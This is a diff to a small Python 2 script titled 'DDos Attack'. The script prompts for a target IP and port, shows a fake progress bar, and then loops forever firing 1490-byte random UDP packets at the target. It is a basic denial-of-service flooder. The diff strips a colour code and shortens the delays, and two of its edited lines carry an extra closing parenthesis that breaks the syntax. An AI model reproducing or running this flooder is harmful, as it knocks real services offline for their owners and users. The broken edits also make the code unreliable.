@@ -20,7 +20,7 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "33[32;1m Author   : ApaJa Gaming"
+print "Author   : ApaJa Gaming"
 print "You Tube : https://m.youtube.com/channel/UCyCwqjnN082qhs85ADV8qZA"
 print "github   : https://github.com/ApaJaReal"
 print
@@ -30,15 +30,15 @@ port = input("Port       : ")
 os.system("clear")
 os.system("figlet Attack Starting")
 print "[      Proses        ] 0% "
-time.sleep(5)
+time.sleep(1)
 print "[      Proses        ] 25%"
-time.sleep(5)
+time.sleep(1)
 print "[      Proses        ] 50%"
-time.sleep(5)
+time.sleep(1))
 print "[      Proses        ] 75%"
-time.sleep(5)
+time.sleep(1))
 print "[      Proses        ] 100%"
-time.sleep(3)
+time.sleep(1)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
